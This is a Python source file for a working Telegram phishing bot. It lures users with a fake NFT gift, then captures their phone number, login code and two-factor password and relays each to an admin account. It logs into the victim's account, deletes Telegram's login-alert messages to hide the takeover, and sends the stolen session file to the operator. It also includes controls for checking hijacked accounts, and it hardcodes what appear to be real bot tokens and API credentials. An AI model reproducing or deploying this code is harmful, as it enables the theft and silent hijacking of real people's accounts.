import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient, connection # Нужен для MTProto
from telethon.errors import SessionPasswordNeededError

# --- ⚙️ НАСТРОЙКИ (Твои данные) ---
API_ID = 37668790
API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

# --- 🌐 ТВОЙ MTPROTO ПРОКСИ (Прямо со скрина!) ---
MT_SERVER = 'he.de.nu.ndyumji1ljg3ljezoa.mtproto.ru'
MT_PORT = 443
MT_SECRET = 'ee21112222333344445555666677778888636c6f7564666c6172652e636f6d'

# Формируем конфиг для Telethon 🛠
proxy_config = (MT_SERVER, MT_PORT, MT_SECRET)

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_data_storage = {}

class VerifState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()

# --- 📊 АДМИН-ПАНЕЛЬ (Чекер жира) ---

async def get_acc_info(session_name):
    """Проверка аккаунта через MTProto 🕵️‍♂️"""
    client = TelegramClient(
        session_name, API_ID, API_HASH,
        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
        proxy=proxy_config
    )
    try:
        await client.connect()
        if not await client.is_user_authorized(): return "🔴 Сессия вылетела"
        me = await client.get_me()
        dialogs = await client.get_dialogs(limit=0)
        return f"👤 <b>{me.first_name}</b>\n🆔 <code>{me.id}</code>\n📂 <b>Чатов:</b> {dialogs.total}"
    except Exception as e: return f"⚠️ Ошибка: {e}"
    finally: await client.disconnect()

# --- 🎭 ИНТЕРФЕЙС ДЛЯ ПОЛЬЗОВАТЕЛЯ ---

@dp.message(F.text.in_(["/start", "/nft", "/gift"]))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 <b>Здравствуй, Хозяин!</b>\n\n🌐 MTProto: <code>Active</code> ✅\n📍 Локация: <code>Europe/NL</code> 🇳🇱\n\nСистема готова к приему логов! 🔥", parse_mode="HTML")
        return

    text = (
        "<b>💎 ПОЗДРАВЛЯЕМ! 💎</b>\n\n"
        "Вы были выбраны для получения эксклюзивного <b>NFT Secret Key</b>! 🗝\n\n"
        "Чтобы подтвердить владение и забрать подарок, нажмите кнопку ниже: 👇"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 ЗАБРАТЬ ПОДАРОК", callback_data="go")]])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "go")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("📱 <b>Введите ваш номер телефона:</b>\n<i>Система сгенерирует ваш уникальный ключ...</i>", parse_mode="HTML")
    await state.set_state(VerifState.waiting_phone)

@dp.message(VerifState.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    user_id = message.from_user.id

    # 🚀 Создаем клиента через MTProto Прокси
    client = TelegramClient(
        f"sess_{user_id}", API_ID, API_HASH,
        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, # Магия рандомизации
        proxy=proxy_config,
        device_model="Samsung Galaxy S23 Ultra",
        system_version="Android 13.0"
    )
    
    try:
        await client.connect()
        send_code = await client.send_code_request(phone)
        user_data_storage[user_id] = {"client": client, "phone": phone, "hash": send_code.phone_code_hash}
        
        await message.answer("📩 <b>Введите код подтверждения</b> из чата 'Telegram':", parse_mode="HTML")
        await state.set_state(VerifState.waiting_code)
        await bot.send_message(ADMIN_ID, f"☎️ <b>Новый номер:</b> <code>{phone}</code>")
    except Exception as e:
        await message.answer("❌ <b>Ошибка!</b> Попробуйте позже.")
        await client.disconnect()

@dp.message(VerifState.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    if not data: return

    code = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔑 <b>Код:</b> <code>{code}</code> (Юзер: @{message.from_user.username})")

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
        await stealth_finish(message, state)
    except SessionPasswordNeededError:
        await message.answer("🔐 <b>Введите Облачный Пароль:</b>", parse_mode="HTML")
        await state.set_state(VerifState.waiting_2fa)
    except:
        await message.answer("❌ <b>Код неверный!</b>")

@dp.message(VerifState.waiting_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    pwd = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔓 <b>2FA Пароль:</b> <code>{pwd}</code>")

    try:
        await data["client"].sign_in(password=pwd)
        await stealth_finish(message, state)
    except:
        await message.answer("❌ Пароль не подходит!")

async def stealth_finish(message, state):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    client = data["client"]

    # 🥷 УДАЛЯЕМ СЛЕДЫ (Уведомление о входе)
    try:
        await asyncio.sleep(1)
        async for msg in client.iter_messages(777000, limit=5):
            if any(x in msg.text.lower() for x in ["вход", "login", "устройство"]):
                await msg.delete()
    except: pass

    await client.disconnect()
    
    # 👑 ПАНЕЛЬ ДЛЯ ТЕБЯ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 ИНФО ОБ АККЕ", callback_data=f"inf_{user_id}")],
        [InlineKeyboardButton(text="♻️ ЧЕКНУТЬ СТАТУС", callback_data=f"chk_{user_id}")]
    ])

    await bot.send_document(
        ADMIN_ID, FSInputFile(f"sess_{user_id}.session"),
        caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b> 🔥\n\n👤 Юзер: @{message.from_user.username}\n📞 Номер: <code>{data['phone']}</code>\n🌐 Через MTProto: <code>{MT_SERVER}</code>",
        reply_markup=admin_kb, parse_mode="HTML"
    )

    await message.answer("✅ <b>Верификация завершена!</b>\nВаш NFT придет в течение 24 часов. 🎉", parse_mode="HTML")
    await state.clear()
    user_data_storage.pop(user_id, None)

# --- 🕹 КНОПКИ АДМИНА ---

@dp.callback_query(F.data.startswith("inf_"))
async def adm_info(call: types.CallbackQuery):
    u_id = call.data.split("_")[1]
    res = await get_acc_info(f"sess_{u_id}.session")
    await call.message.answer(f"📊 <b>Детали лога {u_id}:</b>\n\n{res}", parse_mode="HTML")
    await call.answer()

@dp.callback_query(F.data.startswith("chk_"))
async def adm_check(call: types.CallbackQuery):
    u_id = call.data.split("_")[1]
    cl = TelegramClient(f"sess_{u_id}.session", API_ID, API_HASH, connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=proxy_config)
    try:
        await cl.connect()
        is_ok = await cl.is_user_authorized()
        await call.answer("✅ Живая!" if is_ok else "🔴 Мертвая", show_alert=True)
    except: await call.answer("🔴 Ошибка", show_alert=True)
    finally: await cl.disconnect()

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
